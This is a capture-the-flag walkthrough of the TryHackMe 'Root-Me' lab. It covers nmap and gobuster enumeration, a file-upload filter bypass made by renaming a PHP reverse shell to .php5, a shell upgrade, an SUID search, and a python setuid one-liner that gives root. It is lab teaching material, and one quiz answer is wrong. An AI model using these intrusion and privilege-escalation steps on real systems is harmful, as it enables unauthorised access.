---
layout: default
discription: Amar1337
title: TryHackMe: Root-Me Writeup
---

<center> 
    <big>Root-Me: HTB</big>
</center>

<center>
    <img src="https://i2.wp.com/steflan-security.com/wp-content/uploads/2021/06/RootMe.png?fit=1024%2C409&ssl=1">
</center>

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

*   Information
*   name: <p1> Root-me </p1>
*   OS: <p1> Linux </p1>
*   Difficulty: <p1 style="color:green;">Easy</p1>
*   <a href="https://tryhackme.com/room/rrootme">Room</a>

- Discription:
    - <p2> Box is for beginners but everyone can try it :) </p2>
    - <p2> Enjoy </p2>

## Summary
- Enumerating **dir** with <a href="https://github.com/OJ/gobuster">GoBuster</a>.
- Uploading **reverse shell** and **bypassing** name restriction</a>.
- Successful reverse shell and got **flag.txt**.
- Use **find** command for finding **form** for **privilege escalation**-
- Successful got **root**.

# <big>`nmap`</big>

```js
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#  `Reconnaissance` 

<big> Scan the machine, how many ports are open? </big>
<br><p2> Answer: 2 </p2> 

<big> What version of Apache is running? </big>
<br><p2> Answer: 2.4.29 </p2>

<big> What service is running on port 22? </big>
<br><p2>Answers: 22 </p2>

<big> Find directories on the web server using the GoBuster tool. </big>
<br><p2>Answers: "No answer needed" </p2>

<big> What is the hidden directory? <big>

```
gobuster dir -u 10.10.239.138 -w /usr/share/wordlists/dir/common.txt
```

<img src="https://i.imgur.com/8ztnhds.png">

<br><p2> Answers: /panel/ </p2>

# `Getting a shel`
 
<big> **Find a form to upload and get a reverse shell, and find the flag.** </big>

<br><big> Let's check **/panel** </big>

<img  src="https://miro.medium.com/max/2000/1*ULpCbuyeZs_847F86vjcdA.png">

<br><big> * I tried to upload **php** reverse shell but got **name restriction error** so lets try bypass it </big>

<img src="https://i.imgur.com/eotHiZk.png">

<br><big> * In those link **name restriction bypass** is explained so take a look <big>

* <a href="https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf">File upload restrictions bypass [EXPLOIT-DB]</a>

<br><big> * I tried rename **.php** into **php5** through **burp** and seems working </big> 

<img src="https://i.imgur.com/ihol2A4.png">

<img src="https://i.imgur.com/pXGMH29.png">

<br><big> * Let's try to **execute** </big>

<img src="https://i.imgur.com/JdtMyJr.png">

<br><big> * Let's upgrade **shell** </big>

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

# `Privilege escalation`

<big> **Now that we have a shell, let's escalate our privileges to root.** </big>

<br><big> * Let's use **find** command to find **files** with **SUID permission** <big>

```
find / -user root -perm /4000
```

<img src="https://i.imgur.com/mwhvp9F.png">

<big> Search for files with SUID permission, which file is weird? </big>
<br><p2> Answer: **/usr/bin/python** </p2> 

<big> Find a form to escalate your privileges. </big>
<br><p2> Answer: <a href="https://gtfobins.github.io/">gtfobins</a>

<br><big> * Make sure to use **cd /usr/bin** before **python** and dont forgot **"./"** before **python** </big> 

```
 cd /usr/bin
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

<br><img src="https://i.imgur.com/wxnJ3LH.png">

<big> * And we have a **root** :) </big>

<big> Amar#0484 </big>

## [Back to main page](./../..)
